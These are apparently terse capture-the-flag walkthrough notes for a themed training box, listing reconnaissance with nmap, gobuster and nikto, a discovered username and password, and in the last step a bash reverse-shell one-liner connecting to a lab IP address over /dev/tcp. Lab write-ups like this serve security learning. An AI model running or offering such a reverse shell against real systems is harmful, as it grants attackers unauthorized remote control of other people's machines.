
1. nmap
2. Inspect html
   - Found username `R1ckRul3s`

3. Run gobuster
   - `robots.txt` contains `Wubbalubbadubdub`
4. Run nikto

   Set a reverse shell `https://gtfobins.github.io/gtfobins/bash/`
5. `bash -c 'exec bash -i &>/dev/tcp/10.9.138.149/9999 <&1'

